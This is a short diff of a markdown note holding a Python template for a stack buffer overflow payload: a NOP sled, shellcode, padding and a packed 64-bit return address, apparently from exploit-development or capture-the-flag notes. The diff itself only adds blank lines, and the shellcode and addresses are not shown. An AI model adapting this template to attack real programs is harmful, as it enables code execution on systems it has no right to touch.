@@ -3,6 +3,7 @@
 ## Base python script
 
 `
+
 from struct import pack
 
 nop = '\x90'
@@ -29,5 +30,6 @@ padding = 'A' * (len_payload - len_shell - len_nop)
 payload = nop_payload + buf + padding + pack("<Q", jumpadd)
 
 print(payload)
+
 `
 
